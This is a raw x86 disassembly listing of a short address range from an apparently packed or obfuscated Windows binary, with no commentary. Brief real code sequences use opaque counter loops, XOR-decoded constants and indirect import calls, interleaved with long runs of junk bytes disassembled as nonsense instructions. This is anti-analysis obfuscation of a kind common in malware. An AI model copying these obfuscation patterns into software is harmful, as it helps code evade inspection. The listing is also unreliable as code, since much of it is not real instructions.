  405c87:	add    DWORD PTR [edx+0x7e],ecx
  405c8a:	xchg   esi,eax
  405c8b:	mov    al,ds:0x21603d73
  405c90:	out    0xe5,al
  405c92:	add    BYTE PTR [ebp+0x3619f260],ch
  405c98:	jmp    0x405c67
  405c9a:	cli    
  405c9b:	jo     0x405c43
  405c9d:	adc    al,0x11
  405c9f:	inc    edi
  405ca0:	dec    esp
  405ca1:	cs aaa 
  405ca3:	test   al,0xf1
  405ca6:	pop    es
  405ca7:	xchg   edi,edx
  405ca9:	mov    fs,WORD PTR [ecx+0x43c1a0]
  405caf:	mov    DWORD PTR [ebp-0x10],eax
  405cb2:	mov    eax,ds:0x43c2ac
  405cb7:	sub    DWORD PTR ds:0x445368,0x4427a4
  405cc1:	mov    DWORD PTR [ebp-0x30],eax
  405cc4:	neg    eax
  405cc6:	mov    DWORD PTR [ebp-0xc],0xf89c8535
  405ccd:	adc    eax,DWORD PTR ds:0x41340e
  405cd3:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  405cda:	mov    eax,DWORD PTR [ebp-0xc]
  405cdd:	xor    DWORD PTR ds:0x4427b8,0x59fc
  405ce7:	push   ebx
  405ce8:	or     DWORD PTR ds:0x41341e,0x413416
  405cf2:	push   esi
  405cf3:	adc    DWORD PTR ds:0x413416,edi
  405cf9:	push   edi
  405cfa:	mov    DWORD PTR ds:0x4427ac,0x13
  405d04:	cmp    DWORD PTR ds:0x4427ac,0x0
  405d0b:	je     0x405e95
  405d11:	cmp    DWORD PTR ds:0x4427ac,0x3
  405d18:	jne    0x405d31
  405d1e:	push   0x141c
  405d23:	push   0x6005
  405d28:	push   DWORD PTR [ebp-0xc]
  405d2b:	call   DWORD PTR ds:0x43c5c0
  405d31:	cmp    DWORD PTR ds:0x4427ac,0x4
  405d38:	jne    0x405d4d
  405d3e:	xor    edi,edi
  405d40:	xor    edi,DWORD PTR ds:0x4427ac
  405d46:	dec    edi
  405d47:	mov    DWORD PTR ds:0x4427ac,edi
  405d4d:	mov    edi,DWORD PTR ds:0x4427ac
  405d53:	dec    edi
  405d54:	mov    DWORD PTR ds:0x4427ac,edi
  405d5a:	jmp    0x405d04
  405d5f:	and    DWORD PTR ds:0x43fbe0,0x5029
  405d69:	jmp    0x405e95
  405d6e:	out    0xd6,eax
  405d70:	(bad)  
  405d71:	sub    al,0xf9
  405d73:	sub    al,0xf9
  405d75:	jmp    0x592bcf2a
  405d7a:	dec    edx
  405d7b:	dec    ebp
  405d7c:	pusha  
  405d7d:	or     BYTE PTR [ecx+0xd7c7c21],dl
  405d83:	jg     0x405e01
  405d85:	jl     0x405d17
  405d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d88:	lahf   
  405d89:	jb     0x405deb
  405d8b:	xor    edi,edi
  405d8d:	mov    WORD PTR [ebx+0x793f5720],?
  405d93:	rcl    DWORD PTR ds:0xe0638965,cl
  405d99:	push   0x13928062
  405d9e:	dec    DWORD PTR [esi+0x2b]
  405da1:	adc    bh,dh
  405da3:	push   ebp
  405da4:	out    dx,eax
  405da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405da6:	clc    
  405da7:	sub    dh,BYTE PTR [edi+0x748f38c7]
  405dad:	lods   eax,DWORD PTR ds:[esi]
  405dae:	jp     0x405dc1
  405db0:	mov    ah,0x3e
  405db2:	push   ebp
  405db3:	ins    DWORD PTR es:[edi],dx
  405db4:	call   esp
  405db6:	pop    ss
  405db7:	dec    eax
  405db8:	push   edx
  405db9:	jns    0x405d44
  405dbb:	aaa    
  405dbc:	jl     0x405dfe
  405dbe:	xchg   edi,eax
  405dbf:	cmp    al,0xe0
  405dc1:	mov    esi,0x91aaf78f
  405dc6:	pop    es
  405dc7:	sbb    al,0xba
  405dc9:	les    ecx,FWORD PTR [edi]
  405dcb:	pop    ecx
  405dcc:	add    DWORD PTR [eax],0xf802b5ee
  405dd2:	mov    BYTE PTR [ebp-0x55843b13],bh
  405dd8:	aad    0x0
  405dda:	cmp    BYTE PTR [esi],0x27
  405ddd:	loopne 0x405d9d
  405ddf:	dec    edi
  405de0:	cmp    esi,ebx
  405de2:	sub    DWORD PTR [edx-0x52],0xbe91e867
  405de9:	xor    ebp,DWORD PTR [edx-0x5da4c14]
  405def:	in     al,dx
  405df0:	mov    ch,0x9c
  405df2:	dec    edi
  405df3:	iret   
  405df4:	jno    0x405dcc
  405df6:	imul   ebp,DWORD PTR [ebp+0x63],0x89828a41
  405dfd:	pop    ss
  405dfe:	imul   edi,ebx,0xdd84daca
  405e04:	xchg   ebx,eax
  405e05:	gs mov bl,0x74
  405e08:	out    0x66,al
  405e0a:	push   esi
  405e0b:	daa    
  405e0c:	xchg   esp,eax
  405e0d:	fldcw  WORD PTR [ebx-0x2f]
  405e10:	sub    al,0x85
  405e12:	imul   ecx,DWORD PTR [esi+edx*8-0x725c5516],0xcb006eed
  405e1d:	scas   eax,DWORD PTR es:[edi]
  405e1e:	mov    bl,0x3
  405e20:	je     0x405de4
  405e22:	jns    0x405dcf
  405e24:	or     al,0x47
  405e26:	mov    edi,0x4903e7f6
  405e2b:	push   edx
  405e2c:	popa   
  405e2d:	into   
  405e2e:	(bad)  
  405e2f:	int    0xda
  405e31:	jb     0x405dd2
  405e33:	and    al,0x6a
  405e35:	mov    esp,0x7094bb3f
  405e3a:	fdivr  DWORD PTR [edx-0x38]
  405e3d:	mov    BYTE PTR [esp+ebp*8],dl
  405e40:	aad    0x67
  405e42:	cmp    al,dh
  405e44:	aas    
  405e45:	ins    DWORD PTR es:[edi],dx
  405e46:	mov    esi,0x7a979f99
  405e4b:	nop
  405e4c:	repz aas 
  405e4e:	lahf   
  405e4f:	(bad)  
  405e50:	daa    
  405e51:	test   al,0x19
  405e53:	inc    edx
  405e54:	inc    edi
  405e55:	lock ret 
  405e57:	ins    BYTE PTR es:[edi],dx
  405e58:	in     al,dx
  405e59:	xor    ch,BYTE PTR [eax]
  405e5b:	aas    
  405e5c:	aas    
  405e5d:	addr16 add eax,0xb09ca08a
  405e63:	cmp    al,0xf6
  405e65:	xor    esp,ecx
  405e67:	jle    0x405e1d
  405e69:	jl     0x405eaf
  405e6b:	sbb    al,0x1a
  405e6d:	and    DWORD PTR [edi],ecx
  405e6f:	lds    ebp,FWORD PTR [ebx-0x4c]
  405e72:	rcr    DWORD PTR [ebp-0x506b87f],1
  405e78:	mov    bh,0x34
  405e7a:	dec    esi
  405e7b:	addr16 cmc 
  405e7d:	jecxz  0x405e65
  405e7f:	and    DWORD PTR [ebx],esp
  405e81:	adc    BYTE PTR [ecx-0x30],bl
  405e84:	iret   
  405e85:	fsub   QWORD PTR [eax]
  405e87:	mov    edi,0x4ca626d
  405e8c:	outs   dx,DWORD PTR ds:[esi]
  405e8d:	stos   BYTE PTR es:[edi],al
  405e8e:	cmc    
  405e8f:	pop    esi
  405e90:	xchg   esi,eax
  405e91:	scas   al,BYTE PTR es:[edi]
  405e92:	push   ebp
  405e93:	mov    cl,0xbf
  405e95:	mov    esi,0x7510857
  405e9a:	xor    eax,esi
  405e9c:	movzx  edi,WORD PTR ds:0x4105d3
  405ea3:	xor    DWORD PTR ds:0x43fbd8,edi
  405ea9:	mov    edi,0x32729e
  405eae:	jmp    0x405fda
  405eb3:	icebp  
  405eb4:	popa   
  405eb5:	jno    0x405f2b
  405eb7:	loope  0x405f1d
  405eb9:	mov    DWORD PTR [ecx-0x35],edi
  405ebc:	add    esi,DWORD PTR [esi+0x2d]
  405ebf:	fsubr  DWORD PTR [edi+0x20ae9055]
  405ec5:	jl     0x405f43
  405ec7:	or     eax,0x647c7c7f
  405ecc:	aam    0x17
  405ece:	mov    ch,0x74
  405ed0:	sub    BYTE PTR [eax-0x2f],al
  405ed3:	sub    ebx,DWORD PTR [ebx-0x1fe15701]
  405ed9:	in     al,dx
  405eda:	ds ss and bl,bl
  405ede:	sub    BYTE PTR [esi],dl
  405ee0:	out    0x11,al
  405ee2:	xor    eax,DWORD PTR [edi-0x615b80bf]
  405ee8:	dec    esi
  405ee9:	int    0xad
  405eeb:	xchg   esp,eax
  405eec:	in     al,dx
  405eed:	inc    ebx
  405eee:	inc    edi
  405eef:	dec    edi
  405ef0:	jne    0x405ede
  405ef2:	and    esp,eax
  405ef4:	mul    edx
  405ef6:	or     DWORD PTR ds:0x4482889e,edi
  405efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405efd:	in     eax,0xd9
  405eff:	xor    dh,BYTE PTR [eax+0x55]
  405f02:	call   0x91c5:0x51603d63
  405f09:	in     al,dx
  405f0a:	call   0xcc8f08a0
  405f0f:	add    bl,bh
  405f11:	retf   0x93a4
  405f14:	and    al,0x59
  405f16:	es in  eax,0x82
  405f19:	loope  0x405ed3
  405f1b:	test   eax,0xbb2ea778
  405f20:	push   0xffffff92
  405f22:	push   esp
  405f23:	imul   edi,DWORD PTR [edi],0xf9795e16
  405f29:	loopne 0x405ec2
  405f2b:	aas    
  405f2c:	xor    BYTE PTR [ecx-0x59cde48f],ch
  405f32:	retf   0x99b7
  405f35:	push   edi
  405f36:	mov    WORD PTR [ecx],cs
  405f38:	test   al,0x32
  405f3a:	mov    bh,0x5f
  405f3c:	out    0x13,al
  405f3e:	xor    DWORD PTR [ebp+0x5e047d90],0x72
  405f45:	aas    
  405f46:	icebp  
  405f47:	pop    es
  405f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f49:	in     eax,dx
  405f4a:	push   ds
  405f4b:	in     al,dx
  405f4c:	cmc    
  405f4d:	loope  0x405f22
  405f4f:	mov    ebp,0x5997d9ac
  405f54:	jno    0x405f02
  405f56:	xchg   esp,eax
  405f57:	data16 add al,0xda
  405f5a:	adc    ebx,DWORD PTR [eax]
  405f5c:	and    eax,ebx
  405f5e:	(bad)  
  405f5f:	cmc    
  405f60:	ror    BYTE PTR [edx+0x44f1cfee],cl
  405f66:	xor    DWORD PTR [edx-0x3b52b42e],esp
  405f6c:	jmp    0x81cb5fbf
  405f71:	mov    dl,0x14
  405f73:	sub    eax,0x21ce95d8
  405f78:	loopne 0x405f51
  405f7a:	add    al,0x40
  405f7c:	mov    WORD PTR [esi-0x65cdf48d],cs
  405f82:	in     al,dx
  405f83:	(bad)  
  405f84:	ss pop eax
  405f86:	or     esi,DWORD PTR [ebp+0x11]
  405f89:	jecxz  0x405f3a
  405f8b:	(bad)  
  405f8c:	cmc    
  405f8d:	call   0x3da565e2
  405f92:	jp     0x405fc6
  405f94:	or     BYTE PTR [ebp-0x46],bl
  405f97:	jle    0x405f85
  405f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f9a:	add    BYTE PTR [ecx],bh
  405f9c:	fist   DWORD PTR [edi+0x5b570b53]
  405fa2:	inc    edx
  405fa3:	jg     0x405fa6
  405fa5:	enter  0x2a11,0xbd
  405fa9:	scas   eax,DWORD PTR es:[edi]
  405faa:	test   al,0xe0
  405fac:	ins    BYTE PTR es:[edi],dx
  405fad:	js     0x405f67
  405faf:	cwde   
  405fb0:	fstp   QWORD PTR [esi]
  405fb2:	or     al,0x9d
  405fb4:	jmp    0x5ba4:0x308158cf
  405fbb:	jge    0x405f96
  405fbd:	push   ebx
  405fbe:	dec    edi
  405fbf:	icebp  
  405fc0:	pusha  
  405fc1:	pushf  
  405fc2:	sbb    esp,ecx
  405fc4:	xor    ebx,DWORD PTR [edi+0x51f0ffc2]
  405fca:	dec    ch
  405fcc:	mov    dh,0xe2
  405fce:	dec    ecx
  405fcf:	add    DWORD PTR [edi-0x32fa7a30],esp
  405fd5:	dec    edx
  405fd6:	push   ebx
  405fd7:	(bad)  
  405fd8:	xor    BYTE PTR [ebx+eax*1-0x39],dl
  405fdc:	mov    DWORD PTR [ebp-0x20],eax
  405fdf:	mov    DWORD PTR ds:0x413412,0x15
  405fe9:	cmp    DWORD PTR ds:0x413412,0x0
  405ff0:	je     0x406021
  405ff6:	cmp    DWORD PTR ds:0x413412,0x23
  405ffd:	jne    0x40600e
  406003:	push   0x4107a7
  406008:	call   DWORD PTR ds:0x43c5c4
  40600e:	xor    eax,eax
  406010:	or     eax,DWORD PTR ds:0x413412
  406016:	dec    eax
  406017:	mov    ds:0x413412,eax
  40601c:	jmp    0x405fe9
  406021:	mov    DWORD PTR [ebp-0x28],0xf89cb535
  406028:	mov    DWORD PTR [ebp-0x34],0xf89f0535
  40602f:	mov    DWORD PTR ds:0x43fbec,0x1696
  406039:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  406040:	or     DWORD PTR ds:0x4427b8,edx
  406046:	mov    DWORD PTR [ebp-0x24],0xf89c85d5
  40604d:	and    DWORD PTR ds:0x4105c3,0x0
  406057:	jmp    0x40606a
  40605c:	xor    eax,eax
  40605e:	xor    eax,DWORD PTR ds:0x4105c3
  406064:	inc    eax
  406065:	mov    ds:0x4105c3,eax
  40606a:	cmp    DWORD PTR ds:0x4105c3,0x1c
  406071:	jae    0x4060ad
  406077:	cmp    DWORD PTR ds:0x4105c3,0x2b
  40607e:	jne    0x4060a3
  406084:	push   0x78a8
  406089:	push   0x4427b8
  40608e:	push   0x8180
  406093:	push   0x6239
  406098:	push   0x1782
  40609d:	call   DWORD PTR ds:0x43c844
  4060a3:	jmp    0x40605c
  4060a8:	xor    eax,0x3639
  4060ad:	mov    eax,DWORD PTR [ebp-0xc]
  4060b0:	add    DWORD PTR ds:0x43fbfc,0x2d0a
  4060ba:	xor    eax,esi
  4060bc:	sbb    DWORD PTR ds:0x413402,0x6315
  4060c6:	add    eax,edi
  4060c8:	mov    DWORD PTR [ebp-0x18],eax
  4060cb:	or     DWORD PTR ds:0x44536c,0x658e
  4060d5:	mov    DWORD PTR [ebp-0x1c],0xf89c8530
  4060dc:	mov    BYTE PTR [ebp-0x1],0x57
  4060e0:	or     DWORD PTR ds:0x43fbec,edi
  4060e6:	mov    eax,DWORD PTR [ebp-0xc]
  4060e9:	xor    eax,esi
  4060eb:	add    eax,edi
  4060ed:	sbb    DWORD PTR ds:0x4105d3,0x34b4
  4060f7:	mov    DWORD PTR [ebp-0x18],eax
  4060fa:	dec    DWORD PTR ds:0x43fbf0
  406100:	mov    eax,DWORD PTR [ebp-0x24]
  406103:	xor    eax,esi
  406105:	adc    DWORD PTR ds:0x4105cb,0x43fbe4
  40610f:	add    eax,edi
  406111:	xor    DWORD PTR ds:0x43fbec,0x445378
  40611b:	push   eax
  40611c:	mov    eax,DWORD PTR [ebp-0x28]
  40611f:	xor    eax,esi
  406121:	sbb    DWORD PTR ds:0x43fbf4,0x1e41
  40612b:	add    eax,edi
  40612d:	xor    DWORD PTR ds:0x43fbec,0x44537c
  406137:	push   eax
  406138:	and    DWORD PTR ds:0x4105bf,0x0
  406142:	mov    eax,ds:0x4105bf
  406147:	inc    eax
  406148:	mov    ds:0x4105bf,eax
  40614d:	cmp    DWORD PTR ds:0x4105bf,0xc
  406154:	jne    0x406170
  40615a:	push   0x8a0b
  40615f:	push   0x4427a8
  406164:	push   DWORD PTR [ebp-0x28]
  406167:	push   DWORD PTR [ebp-0x20]
  40616a:	call   DWORD PTR ds:0x43c5c8
  406170:	cmp    DWORD PTR ds:0x4105bf,0xb
  406177:	jne    0x40618b
  40617d:	xor    eax,eax
  40617f:	add    eax,DWORD PTR ds:0x4105bf
  406185:	inc    eax
  406186:	mov    ds:0x4105bf,eax
  40618b:	cmp    DWORD PTR ds:0x4105bf,0x17
  406192:	jb     0x406142
  406198:	movzx  eax,BYTE PTR ds:0x41340a
  40619f:	xor    DWORD PTR ds:0x4427b0,eax
  4061a5:	mov    eax,DWORD PTR [ebp-0x1c]
  4061a8:	neg    DWORD PTR ds:0x413412
  4061ae:	xor    eax,esi
  4061b0:	add    eax,edi
  4061b2:	or     DWORD PTR ds:0x4427b0,0x4105bf
  4061bc:	jmp    0x4062e8
  4061c1:	sar    DWORD PTR [ebp+0x7d793df9],cl
  4061c7:	sar    DWORD PTR [ebp+0x7a],cl
  4061ca:	sub    eax,0xb6b6f1da
  4061cf:	add    esi,esi
  4061d1:	mov    edi,0xd7c7c23
  4061d6:	jg     0x406254
  4061d8:	jl     0x4061ff
  4061da:	mov    esi,0x9fe8a5ac
  4061df:	lahf   
  4061e0:	push   esi
  4061e1:	jo     0x4061a1
  4061e3:	jl     0x4061b0
  4061e5:	or     ecx,DWORD PTR [ebx-0x148c0914]
  4061eb:	scas   eax,DWORD PTR es:[edi]
  4061ec:	xlat   BYTE PTR ss:[ebx]
  4061ee:	inc    esp
  4061ef:	out    0xc5,al
  4061f1:	mov    edx,0x2884b741
  4061f6:	push   es
  4061f7:	popf   
  4061f8:	add    al,ah
  4061fa:	jb     0x4061ce
  4061fc:	cmp    dl,BYTE PTR [esi+0x43]
  4061ff:	xchg   ecx,eax
  406200:	popf   
  406201:	repnz out dx,eax
  406203:	into   
  406204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406205:	xor    dh,cl
  406207:	(bad)  
  406208:	idiv   dl
  40620a:	push   ebp
  40620b:	add    DWORD PTR [edi+0x56c4277],edi
  406211:	cld    
  406212:	xlat   BYTE PTR ds:[ebx]
  406213:	shl    BYTE PTR [edi+0x31ce2a01],1
  406219:	push   ebx
  40621a:	dec    BYTE PTR [eax]
  40621c:	cmp    DWORD PTR [edi+0x35],0x6b5834b0
  406223:	xchg   ebx,eax
  406224:	rcr    DWORD PTR [esi],cl
  406226:	in     eax,dx
  406227:	pusha  
  406228:	and    DWORD PTR [ebx+edx*8],edi
  40622b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40622c:	ins    DWORD PTR es:[edi],dx
  40622d:	cld    
  40622e:	jno    0x406296
  406230:	inc    ecx
  406231:	shl    DWORD PTR [eax-0x78],cl
  406234:	bound  ebx,QWORD PTR [edi]
  406236:	xchg   edx,eax
  406237:	gs inc esp
  406239:	std    
  40623a:	(bad)  
  40623b:	jb     0x40621a
  40623d:	out    dx,eax
  40623e:	jne    0x4061ca
  406240:	shl    esp,0xaf
  406243:	cli    
  406244:	pop    DWORD PTR [edx+eax*4-0x34]
  406248:	sbb    al,cl
  40624a:	sub    bl,BYTE PTR [edx+0x69c14f8a]
  406250:	or     ch,dl
  406252:	pop    ebx
  406253:	add    eax,0x242bbd3a
  406258:	bound  edi,QWORD PTR [eax+0x27ac529b]
  40625e:	clc    
  40625f:	inc    ecx
  406260:	hlt    
  406261:	jmp    0x1ace:0x54504c67
  406268:	pop    eax
  406269:	repz rol bh,1
  40626c:	xchg   esi,eax
  40626d:	retf   0x7df7
  406270:	or     al,0xef
  406272:	lea    edx,[esi+0x41]
  406275:	push   edx
  406276:	xchg   edx,eax
  406277:	xbegin 0x16738386
  40627d:	fst    QWORD PTR [ebx-0x80]
  406280:	scas   eax,DWORD PTR es:[edi]
  406281:	inc    ebp
  406282:	mov    ebp,0x5002974f
  406287:	lahf   
  406288:	xor    eax,0x3457a06a
  40628d:	inc    edx
  40628e:	gs dec esi
  406290:	mov    dl,0x84
  406292:	fdivrp st(1),st
  406294:	sahf   
  406295:	stos   DWORD PTR es:[edi],eax
  406296:	push   edi
  406297:	ins    BYTE PTR es:[edi],dx
  406298:	imul   eax
  40629a:	cli    
  40629b:	(bad)  
  40629c:	repz and ebp,DWORD PTR [edi-0x2c]
  4062a0:	retf   0xed8b
  4062a3:	inc    eax
  4062a4:	xor    BYTE PTR [ebx],dh
  4062a6:	push   esi
  4062a7:	mov    ecx,0x7d70419e
  4062ac:	(bad)  
  4062ae:	fbld   TBYTE PTR [edi-0x5cf88781]
  4062b4:	outs   dx,BYTE PTR ds:[esi]
  4062b5:	ds ror dh,cl
  4062b8:	mov    bh,0x61
  4062ba:	pop    edx
  4062bb:	into   
  4062bc:	mov    dh,0x3d
  4062be:	or     DWORD PTR [ebx+0x68ad3019],0x8d129ec2
  4062c8:	int    0xe3
  4062ca:	and    esp,DWORD PTR [ebx-0x552144f2]
  4062d0:	adc    ebp,ebx
  4062d2:	repnz xchg edi,eax
  4062d4:	push   ebx
  4062d5:	inc    ebx
  4062d6:	xchg   ecx,eax
  4062d7:	jno    0x406283
  4062d9:	sbb    DWORD PTR [ebx-0x29dd3ddf],eax
  4062df:	pop    ecx
  4062e0:	add    BYTE PTR [ebp-0x33],cl
  4062e3:	xchg   BYTE PTR [edi+0x50fd3330],cl
  4062e9:	lea    eax,[ebp-0x78]
  4062ec:	add    DWORD PTR ds:0x445368,0x445370
  4062f6:	push   eax
  4062f7:	or     DWORD PTR ds:0x43fbfc,0x41340e
  406301:	push   DWORD PTR [ebp-0xc]
  406304:	add    DWORD PTR ds:0x4427a4,0x413416
  40630e:	jmp    0x40643a
  406313:	push   edx
  406314:	repz fist WORD PTR [ebp-0x4cadaa2f]
  40631b:	adc    DWORD PTR [esi-0x756fcf51],esp
  406321:	xchg   DWORD PTR [esi+0x7c7c224c],edi
  406327:	or     eax,0xdf7c7c7f
  40632c:	jp     0x4062ed
  40632e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40632f:	add    eax,0x7e90fadb
  406334:	and    al,0x88
  406336:	fs dec edi
  406338:	add    eax,DWORD PTR [edi]
  40633a:	int3   
  40633b:	jne    0x406343
  40633d:	je     0x40630f
  40633f:	inc    ebp
  406340:	dec    esp
  406341:	lahf   
  406342:	jmp    0x406302
  406344:	ficomp DWORD PTR [ebx]
  406346:	test   DWORD PTR ds:0x6e603721,ecx
  40634c:	daa    
  40634d:	mov    ch,0xe1
  40634f:	fsub   DWORD PTR [edi+edx*8]
  406352:	inc    ebx
  406353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406354:	adc    DWORD PTR [ecx-0x44],ebx
  406357:	jg     0x406372
  406359:	mov    eax,0x569a267
  40635e:	xchg   esp,eax
  40635f:	adc    al,0x3b
  406361:	inc    eax
  406362:	push   ds
  406363:	lods   eax,DWORD PTR ds:[esi]
  406364:	jmp    0x4063c4
  406366:	sub    ebp,DWORD PTR [ecx-0x6d]
  406369:	cmp    BYTE PTR [edx+0x14],0x4d
  40636d:	jb     0x40639e
  40636f:	mov    bl,0x5
  406371:	call   0x36b1:0x4b7c1673
  406378:	pop    ds
  406379:	mov    esp,0x8bb2d3d4
  40637e:	and    DWORD PTR [edi],edi
  406380:	retf   0x7ddd
  406383:	cld    
  406384:	(bad)  
  406385:	jmp    0xdbf805d6
  40638a:	cmp    ecx,edx
  40638c:	ror    BYTE PTR [edi],1
  40638e:	sub    al,0x18
  406390:	push   0x67bf97c6
  406395:	call   0x2457595a
  40639a:	daa    
  40639b:	inc    edx
  40639c:	mov    DWORD PTR [esi-0x3c],0xa2c7583
  4063a3:	hlt    
  4063a4:	sbb    BYTE PTR [edx+ecx*2+0x2523c38b],ah
  4063ab:	sub    ah,BYTE PTR [esi+0xc]
  4063ae:	in     eax,0x65
  4063b0:	mov    ecx,0x713d38a4
  4063b5:	pop    ss
  4063b6:	and    al,0x6f
  4063b8:	cmp    BYTE PTR [esi-0xe05c17],ch
  4063be:	push   esp
  4063bf:	sbb    ebx,eax
  4063c1:	call   0xd136f0a0
  4063c6:	inc    ebp
  4063c7:	test   al,0xb4
  4063c9:	pop    ebp
  4063ca:	shl    BYTE PTR [esi-0x7b48a108],0x1
  4063d1:	cld    
  4063d2:	(bad)  
  4063d3:	cdq    
  4063d4:	dec    eax
  4063d5:	imul   esi,DWORD PTR [ebx-0x14],0x74aed773
  4063dc:	mov    ah,0x23
  4063de:	xchg   edx,eax
  4063df:	push   ds
  4063e0:	adc    eax,0xaf32dce8
  4063e5:	out    dx,eax
  4063e6:	shl    DWORD PTR [ebx-0x6e31e4a0],cl
  4063ec:	int    0x62
  4063ee:	out    dx,eax
  4063ef:	dec    eax
  4063f0:	adc    BYTE PTR [ebx],al
  4063f2:	cmc    
  4063f3:	mov    dh,0xc1
  4063f5:	push   ebx
  4063f6:	je     0x406399
  4063f8:	push   ebx
  4063f9:	cmp    eax,DWORD PTR [eax]
  4063fb:	mov    edi,0xb6e766e3
  406400:	repz mov ebx,0xdfbb3564
  406406:	pop    es
  406407:	cmp    BYTE PTR [esp+edi*8-0x2d3e6534],bh
  40640e:	fidiv  WORD PTR [edi+0x6c36ca]
  406414:	push   edx
  406415:	ret    
  406416:	mov    bl,BYTE PTR [ecx-0x29]
  406419:	pop    ss
  40641a:	lea    edx,[edx+0x1]
  40641d:	add    edi,edx
  40641f:	mov    eax,ds:0x534cc635
  406424:	int    0xf5
  406426:	shl    DWORD PTR [edi],1
  406428:	shl    DWORD PTR [edi-0x2d],0x44
  40642c:	inc    ebp
  40642d:	repz push esp
  40642f:	add    DWORD PTR [ebx+0x631ef2bc],0xffffffe4
  406436:	outs   dx,DWORD PTR ds:[esi]
  406437:	dec    eax
  406438:	scas   eax,DWORD PTR es:[edi]
  406439:	jno    0x40643a
  40643b:	jne    0x406429
  40643d:	jmp    0x406569
  406442:	xchg   BYTE PTR [edi-0x29ad99e],ah
  406448:	pop    edx
  406449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644a:	inc    eax
  40644b:	adc    al,0x79
  40644d:	sub    al,0x98
  40644f:	ds dec edi
  406451:	push   esp
  406452:	pop    ebp
  406453:	and    eax,0x7f0d7c7c
  406458:	jl     0x4064d6
  40645a:	sub    edi,ebp
  40645c:	sbb    DWORD PTR [eax+0x3a],ecx
  40645f:	(bad)  
  406461:	(bad)  
  406462:	fistp  WORD PTR [ecx]
  406464:	add    cl,dh
  406466:	lods   al,BYTE PTR ds:[esi]
  406467:	adc    ecx,DWORD PTR [ecx]
  406469:	mov    esi,0x47f4c956
  40646e:	pop    edx
  40646f:	jbe    0x406499
  406471:	cld    
  406472:	jp     0x406421
  406474:	push   sp
  406476:	gs inc ebp
  406478:	and    DWORD PTR [ebx],eax
  40647a:	mov    eax,ds:0xc20ad64a
  40647f:	ret    
  406480:	sbb    BYTE PTR [ecx],0x88
  406483:	sti    
  406484:	ss push edx
  406486:	mov    ebx,0x9e7caeb3
  40648b:	xchg   ebx,eax
  40648c:	ror    BYTE PTR [ecx-0xf],cl
  40648f:	inc    ebp
  406490:	or     eax,0x9aa3588
  406495:	pop    es
  406496:	dec    esi
  406497:	jge    0x4064a0
  406499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40649a:	jno    0x40642a
  40649c:	(bad)  
  40649d:	cmp    ch,BYTE PTR [edx+ebx*4+0x75]
  4064a1:	pop    ss
  4064a2:	push   ss
  4064a3:	mov    dh,0x73
  4064a5:	cwde   
  4064a6:	into   
  4064a7:	sahf   
  4064a8:	inc    ebp
  4064a9:	push   esi
  4064aa:	or     BYTE PTR [edx],dl
  4064ac:	jo     0x40649e
  4064ae:	in     al,0x55
  4064b0:	cdq    
  4064b1:	jbe    0x40645a
  4064b3:	psrld  mm4,QWORD PTR [esi]
  4064b6:	out    0x3c,eax
  4064b8:	loope  0x40644b
  4064ba:	outs   dx,BYTE PTR ds:[esi]
  4064bb:	(bad)  
  4064bc:	jp     0x406466
  4064be:	jo     0x406442
  4064c0:	rep outs dx,DWORD PTR ds:[esi]
  4064c2:	int3   
  4064c3:	js     0x4064ec
  4064c5:	sub    eax,0xaf59afb6
  4064ca:	in     eax,0xc
  4064cc:	mov    dl,0x36
  4064ce:	fisttp WORD PTR [eax-0x6a]
  4064d2:	adc    ah,BYTE PTR [esi-0x700d6aa1]
  4064d8:	pop    ds
  4064d9:	inc    ebx
  4064da:	imul   BYTE PTR [eax-0x61]
  4064dd:	jnp    0x4064be
  4064df:	repz push esp
  4064e1:	add    ebp,DWORD PTR [edi-0x590c4db3]
  4064e7:	add    DWORD PTR [eax-0x57467944],ebx
  4064ed:	mov    esi,0xbeb4b51d
  4064f2:	fdiv   QWORD PTR [edx]
  4064f4:	pop    edi
  4064f5:	clc    
  4064f6:	jae    0x40649f
  4064f8:	int3   
  4064f9:	or     BYTE PTR [edx+0x2f],ah
  4064fc:	rcr    BYTE PTR [edi+0x327ba71d],0x7e
  406503:	jle    0x406535
  406505:	popf   
  406506:	leave  
  406507:	test   ch,ch
  406509:	outs   dx,DWORD PTR ds:[esi]
  40650a:	mov    ds:0xddbeec9,eax
  40650f:	cdq    
  406510:	not    BYTE PTR [ebp+0x6cc491e8]
  406516:	mov    edx,0x3e85ce0f
  40651b:	rcl    DWORD PTR [edx+0x7c],cl
  40651e:	fld    QWORD PTR [ebx-0x22d5d8ab]
  406524:	hlt    
  406525:	lea    ecx,[ebp+0x7f6b491c]
  40652b:	popa   
  40652c:	ret    
  40652d:	jmp    0x69823ea2
  406532:	(bad)  
  406533:	adc    ecx,DWORD PTR [edx]
  406535:	outs   dx,DWORD PTR ds:[esi]
  406536:	cmp    dh,al
  406538:	fnstsw WORD PTR cs:[ebx]
  40653b:	push   ds
  40653c:	dec    edx
  40653d:	pop    ecx
  40653e:	shl    DWORD PTR [ebp+0x29b362eb],0x19
  406545:	ins    BYTE PTR es:[edi],dx
  406546:	push   esi
  406547:	inc    BYTE PTR [edx-0x211ba255]
  40654d:	push   cs
  40654e:	sbb    eax,0x5e47d268
  406553:	test   al,0xe5
  406555:	outs   dx,DWORD PTR ds:[esi]
  406556:	ss enter 0x4fbd,0xea
  40655b:	pop    ebp
  40655c:	add    esi,DWORD PTR [eax+ebx*8]
  40655f:	sub    eax,0x27aca947
  406564:	loope  0x406576
  406566:	and    al,0xd2
  406568:	repz call 0x405120
  40656e:	test   eax,eax
  406570:	je     0x40692c
  406576:	sbb    DWORD PTR ds:0x4105db,0x43fbf4
  406580:	lea    eax,[ebp-0x78]
  406583:	push   eax
  406584:	mov    eax,DWORD PTR [ebp-0x14]
  406587:	xor    eax,esi
  406589:	add    eax,edi
  40658b:	push   eax
  40658c:	mov    eax,DWORD PTR [ebp-0x10]
